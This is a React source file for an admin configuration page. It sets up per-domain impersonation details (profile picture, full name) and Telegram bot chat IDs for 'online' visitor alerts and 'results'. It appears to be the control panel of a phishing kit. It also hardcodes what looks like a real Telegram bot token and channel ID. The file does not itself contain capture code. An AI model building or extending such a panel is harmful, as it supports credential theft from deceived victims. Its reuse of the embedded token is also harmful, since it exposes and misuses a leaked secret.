import React, { useEffect, useState } from "react";
import { Layout, Input, Button, Menu, Breadcrumb } from "antd";
const { Header, Content, Footer } = Layout;
import { useNavigate } from "react-router-dom";

import { API_BE } from "./utils/variable";
import axios from "axios";

export const AdminConfig = () => {
  const hostname = window.location.hostname;
  const navigate = useNavigate();

  const [isUpdate, setUpdate] = useState({
    loading: true,
    update: false,
  });

  const [values, setValues] = useState({
    domain: hostname,
    imgUrl: "",
    profileImgUrl: "",
    fullName: "",
    telegramChatIdVisitor: "-1002085841631", // Default to your channel ID
    telegramChatIdResult: "", // Can be used for a different Telegram chat if needed
    telegramToken: "6746965038:AAFzTkUlQ8DmDsb4fql2V_MvOpQhICxBEzw", // Your bot token
  });

  const createNewConfig = async (values) => {
    try {
      await axios.post(`${API_BE}/config/`, values);
      await getConfig(hostname);
    } catch (error) {
      console.error("Error creating config:", error);
    }
  };

  const updateConfig = async (values) => {
    try {
      await axios.patch(`${API_BE}/config/${values?.domain}/`, values);
      await getConfig(hostname);
    } catch (error) {
      console.error("Error updating config:", error);
    }
  };

  const getConfig = async (hostname) => {
    try {
      const config = await axios.get(
        `${API_BE}/config/${hostname}/`
      );

      if (config && config?.data) {
        setValues(config?.data);
        setUpdate({ ...isUpdate, update: true, loading: false });
      } else {
        setUpdate({ ...isUpdate, update: false, loading: false });
      }
    } catch (error) {
      setUpdate({ ...isUpdate, update: false, loading: false });
      console.error("Error fetching config:", error);
    }
  };

  useEffect(() => {
    getConfig(hostname);
  }, []);

  return (
    <Layout className="dashboard__wrapper">
      <Header>
        <Menu
          theme="dark"
          mode="horizontal"
          defaultSelectedKeys={["2"]}
          items={[
            { key: "1", label: "Dashboard" },
            { key: "2", label: "Config" },
          ]}
          onClick={({ key }) => {
            if (key === "1") {
              navigate("/ppi");
            } else {
              navigate("/ppi/config");
            }
          }}
        />
      </Header>
      <Content style={{ padding: "0 50px" }}>
        <Breadcrumb style={{ margin: "16px 0" }}>
          <Breadcrumb.Item>Home</Breadcrumb.Item>
          <Breadcrumb.Item>List</Breadcrumb.Item>
          <Breadcrumb.Item>App</Breadcrumb.Item>
        </Breadcrumb>
        <div className="site-layout-content">
          <div className="admin-config">
            <br />
            <br />
            <h1>Admin Config</h1>
            <form>
              <label>Web unique</label>
              <Input
                disabled
                value={values?.domain}
                onChange={(e) =>
                  setValues({ ...values, domain: e.target.value })
                }
              />
              <br />
              <br />
              <label>Image URL</label>
              <Input
                value={values?.imgUrl}
                onChange={(e) =>
                  setValues({ ...values, imgUrl: e.target.value })
                }
              />
              <br />
              <br />
              <label>Profile pic URL</label>
              <Input
                value={values?.profileImgUrl}
                onChange={(e) =>
                  setValues({ ...values, profileImgUrl: e.target.value })
                }
              />
              <br />
              <br />
              <label>Full name</label>
              <Input
                value={values?.fullName}
                onChange={(e) =>
                  setValues({ ...values, fullName: e.target.value })
                }
              />
              <br />
              <br />
              <label>Telegram BOT ONLINE Chat ID</label>
              <Input
                value={values?.telegramChatIdVisitor}
                onChange={(e) =>
                  setValues({ ...values, telegramChatIdVisitor: e.target.value })
                }
              />
              <br />
              <br />
              <label>Telegram BOT RESULT Chat ID</label>
              <Input
                value={values?.telegramChatIdResult}
                onChange={(e) =>
                  setValues({ ...values, telegramChatIdResult: e.target.value })
                }
              />
              <br />
              <br />
              <label>Telegram BOT TOKEN</label>
              <Input
                value={values?.telegramToken}
                onChange={(e) =>
                  setValues({ ...values, telegramToken: e.target.value })
                }
              />
              <br />
              <br />
              <Button
                disabled={isUpdate?.loading}
                type="primary"
                onClick={() => {
                  if (isUpdate.update) {
                    updateConfig(values);
                  } else {
                    createNewConfig(values);
                  }
                }}
              >
                {isUpdate?.loading
                  ? "Loading"
                  : isUpdate?.update
                  ? "Update"
                  : "Submit"}
              </Button>
              <br />
              <br />
            </form>
          </div>
        </div>
      </Content>
      <Footer style={{ textAlign: "center" }}>SHHH......</Footer>
    </Layout>
  );
};
